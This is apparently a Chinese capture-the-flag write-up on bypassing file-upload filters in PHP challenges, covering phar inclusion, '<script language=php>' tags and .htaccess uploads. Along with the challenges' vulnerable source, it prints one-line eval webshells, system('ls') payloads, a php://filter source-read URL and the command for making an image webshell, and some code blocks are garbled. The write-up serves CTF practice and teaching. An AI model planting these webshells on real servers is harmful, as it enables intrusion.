最近刷了几道文件上传的题，其中包括 js 绕过、.htaccess 上传、phar
绕过，文件上传的题目一般都是黑盒，白盒审计很少，奇奇怪怪的东西还是挺多的。就我自己来说，做这种题一般都是各种都试试，基本上都能出来。

##  **姿势一：Pr绕过上传限制**

![v2-6e91ddfb337e40fa1f0152f17fa0e404_b.png](https://image.3001.net/images/20210128/1611799934_60121d7e2d7bc75179cea.png!small)
进行压缩，之后把 rar 的后缀名改成 jpeg 格式

首先我们在本地测试一下: 准备一句话木马

test.php

    
    
    <?php @eval($_POST["cmd"]);?>

index.php![v2-ea4fa37d1568751cc7f4e04f3e49be91_b.png](https://image.3001.net/images/20210128/1611799935_60121d7f19cf25b341c37.png!small)可以看到，是可以执行的。

安恒月赛： **image_up**

首先我们把源码读出来:

这里是利用伪协议读取源码/index.php?page=php://filter/read=convert.base64-encode/resource=index.php

index.php

    
    
    <?phpif(isset($_GET['page'])){ if(!stristr($_GET['page'],"..")){$page = $_GET['page'].".php";include($page);}else{header("Location: index.php?page=login"); }}else{header("Location: index.php?page=login");}

login.php

    
    
    <?php if(isset($_POST['username'])&&isset($_POST['password'])){header("Location: index.php?page=upload");exit(); }?>

upload.php

    
    
    <?php$error = "";$exts = array("jpg","png","gif","jpeg"); if(!empty($_FILES["image"])){$temp = explode(".", $_FILES["image"]["name"]);$extension = end($temp); if((@$_upfileS["image"]["size"] < 102400)) {if(in_array($extension,$exts)){$path = "uploads/".md5($temp[0].time()).".".$extensmove_uploaded_file($_FILES["image"]["tmp_name"], $p $error = "上传成功!";} else{$error = "上传失败!"; }}else{$error = "文件过大，上传失败!";} }?>

这道题就是利用 phar 伪协议去包含我们写好的一句话

具体做法: 木马文件打包成压缩包，然后改后缀，再利用 phar 伪协议读取

    
    
    phar://./uploads/4h214215521321.jpg/1

最后用蚁剑链接就可以拿到 flag

##  **姿势二：js绕过**

**例题一**![v2-33c8ae2085d57e9c163ad0002bfdbe28_b.png](https://image.3001.net/images/20210128/1611799935_60121d7f85a4c3335413f.png!small)
查看源码之后发现文件上传，图片马

先来做一个吧

合成图片马的命令:copy 1.png /b + 1.txt /a
2.png![v2-2dd341ce9bf60a3cfb380df9b3e3f93b_b.png](https://image.3001.net/images/20210128/1611799936_60121d806202e7345fa17.png!small)我们先来上传一个一句话木马吧，![v2-a6bdfd3e402acd41309c500f9e069384_b.png](https://image.3001.net/images/20210128/1611799936_60121d80dd5c2f8dbbda9.png!small)这里发现是能够上传成功的，但是不解析，最后利用
JS 绕过 payload:

<script language=php>system("ls")</script>

利用 file 读取上传的文件，发现是解析 php 文件的  
![v2-965e6cf7a0cf946a17b2c4b25ea9b808_b.png](https://image.3001.net/images/20210128/1611799937_60121d81344e9533691bf.png!small)查看文件名发现有
flag 相关文件，直接读就出  
![v2-0040d1efd5a9bb7070122bb4bf4e4a15_b.png](https://image.3001.net/images/20210128/1611799937_60121d81cd03f79522e89.png!small)
**例题二：安恒 A 计划**

先附上源码吧

index.php

    
    
    ?phperror_reporting(0); highlight_file(__FILE__);$file = $_GET['file'];if (preg_match("/flag/", $file)){die('Oh no!'); }include $file;?>

file_up1oad.php

    
    
    <?phperror_reporting(0); date_default_timezone_set('PRC'); if(isset($_FILES['file'])) {$file_name = basename($_FILES["file"]["name"]);$file_ext = pathinfo($file_name,PATHINFO_EXTENSION); $file_type = $_FILES['file']['type'];$file_content = $_FILES['file']['tmp_name']; if(in_array($file_ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) {die('Php file ?');}if (!in_array($file_type, ['image/jpeg', 'image/gif', 'image/ png'])){die('Bad file'); }if (preg_match("/<\?php|eval|assert|@/i", file_get_contents($ file_content))){die('Bad file of content !'); }if (!file_exists('uploads')){ mkdir('uploads');}$new_filename = md5(time()).'.'.$file_ext;$u = move_uploaded_file($_FILES['file']['tmp_name'], './uploads/' . $new_filename); if ($u){echo 'Successful'."\n";echo '/uploads/'.$new_filename; }}?><html><body><meta charset="UTF-8"><h2>File upload</h2><form action="" method="post" enctype="multipart/form-data"><label for="file">Filename:</label><input type="file" name="file" id="file"/><br /> <input type="submit" name="submit" value="submit" /></form></body></html>

审计了一下，估计也就是 js
合成个图片马![v2-ff0d67bfac69709125a53815232f70d7_b.png](https://image.3001.net/images/20210128/1611799938_60121d826b5e5d777fa1a.png!small)php
文件:

    
    
    <script language="php"> system( 'ls'); </script>

![v2-0e49366ba5c6985669a4b794a0caac38_720w.png](https://image.3001.net/images/20210128/1611799938_60121d82df7499a9d99c3.png!small)合成木马直接上传，

/index.php/?file=/var/www/html/uploads/62bfd63a7b411adea7a484c88cbaed0d.png

利用一下文件包含  
![v2-aa88ce42778e750b071cb3eefc237a32_b.png](https://image.3001.net/images/20210128/1611799939_60121d83546dedeb84b94.png!small)直接查看
flag 文件  
![v2-46d8c7c9235f8056b61aeb096c190342_b.png](https://image.3001.net/images/20210128/1611799939_60121d83cebbb3eaa18de.png!small)
**例题三：[GXYCTF2019]BabyUpload**  
![v2-2a4aa80a3d1c250b2175c436b1713ba8_b.png](https://image.3001.net/images/20210128/1611799940_60121d844c0a45bee78d0.png!small)

    
    
    <script language="Php">eval ($_POST[1]);</script>

合成图片马:

直接上传蚁剑连接![v2-c698cde21a7f10f4f10f7aa802140c03_720w.png](https://image.3001.net/images/20210128/1611799940_60121d84e8b61c0daf391.png!small)源码:

    
    
    <?phpsession_start();echo "<meta http-equiv=\"Content-Type\" content=\"text/html; char set=utf-8\" /><title>Upload</title><form action=\"\" method=\"post\" enctype=\"multipart/form-data\" >上传文件<input type=\"file\" name=\"uploaded\" /><input type=\"submit\" name=\"submit\" value=\"上传\" /> </form>";error_reporting(0); if(!isset($_SESSION['user'])){$_SESSION['user'] = md5((string)time() . (string)rand(100, 10 00));}if(isset($_FILES['uploaded'])) {$target_path = getcwd() . "/upload/" . md5($_SESSION['user']) ;$t_path = $target_path . "/" . basename($_FILES['uploaded'][' name']);$uploaded_name = $_FILES['uploaded']['name'];$uploaded_ext = substr($uploaded_name, strrpos($uploaded_nam e,'.') + 1);$uploaded_size = $_FILES['uploaded']['size']; $uploaded_tmp = $_FILES['uploaded']['tmp_name'];if(preg_match("/ph/i", strtolower($uploaded_ext))){ die("后缀名不能有 ph!");} else{if ((($_FILES["uploaded"]["type"] == "") || ($_FILES["uploaded"]["type"] == "image/jpeg") || ($_FILES["uploaded"]["type"] == "image/pjpeg")) && ($_FILES["up loaded"]["size"] < 2048)){$content = file_get_contents($uploaded_tmp); if(preg_match("/\<\?/i", $content)){die("诶，别蒙我啊，这标志明显还是 php 啊"); }else{mkdir(iconv("UTF-8", "GBK", $target_path), 0777,true);move_uploaded_file($uploaded_tmp, $t_path); echo "{$t_path} succesfully uploaded!";}} else{die("上传类型也太露骨了吧!"); }} }?>

##  **姿势三：.htaccess上传**

![v2-3cf4d225136304cbe9b8b91634bb699b_720w.png](https://image.3001.net/images/20210128/1611799941_60121d858bfe84d213114.png!small)
我们把 content-type 改成 image/jpeg
格式![v2-e219f0afe8f3c19f958371dc9b6a78df_720w.png](https://image.3001.net/images/20210128/1611799942_60121d8637d41062fe982.png!small)发现上传成功，下一步就是传图片马![v2-b766ef21c74d628307b79bff2443dc03_720w.png](https://image.3001.net/images/20210128/1611799942_60121d868934b0cb99472.png!small)源码:
index.php

    
    
    <?phpsession_start();echo "<meta charset=\"utf-8\"><title>是兄弟就来传<a><img src=\"https://s1.ax1x.com/2020/03/13/8KBOlq.jpg\" alt=\"8 KBOlq.jpg\" border=\"0\" /></a<a><img src=\"https://s1.ax1x.com/2020/03/13/8KcVoT.md.jpg\" alt= \"8KcVoT.jpg\" border=\"0\" /></a><form action=\"upload.php\" method=\"post\" enctype=\"multipart/f orm-data\"><input type=\"file\" name=\"uploaded\" /><br/><input type=\"submit\" name=\"submit\" value=\"一键去世\" /> </form>";if(!isset($_SESSION['user'])){$_SESSION['user'] = md5((string)time() . (string)rand(100, 10 00));}?>

upload.php

    
    
    <?phpsession_start();echo "<meta charset=\"utf-8\">"; if(!isset($_SESSION['user'])){$_SESSION['user'] = md5((string)time() . (string)rand(100, 10 00));}if(isset($_FILES['uploaded'])) {$target_path = getcwd() . "/upload/" . md5($_SESSION['user']) ;$t_path = $target_path . "/" . basename($_FILES['uploaded'][' name']);$uploaded_name = $_FILES['uploaded']['name'];$uploaded_ext = substr($uploaded_name, strrpos($uploaded_nam e,'.') + 1);$uploaded_size = $_FILES['uploaded']['size']; $uploaded_tmp = $_FILES['uploaded']['tmp_name'];if(preg_match("/ph/i", strtolower($uploaded_ext))){ die("我扌 your problem?");}else{if ((($_FILES["uploaded"]["type"] == "") || ($_FILES["uploaded"]["type"] == "image/jpeg") | | ($_FILES["uploaded"]["type"] == "image/pjpeg")|| ($_FILES["uplo aded"]["type"] == "image/png")) && ($_FILES["uploaded"]["size"] <2048)){mkdir(iconv("UTF-8", "GBK", $target_path), 0777, true)move_uploaded_file($uploaded_tmp, $t_path);echo "{$t_path} succesfully uploaded!"; }else{die("我扌 your problem?");}}}﻿

![v2-536ca0674d0e9e9ed419d2eb2c092d64_720w.png](https://image.3001.net/images/20210128/1611799943_60121d8751686eee50477.png!small)

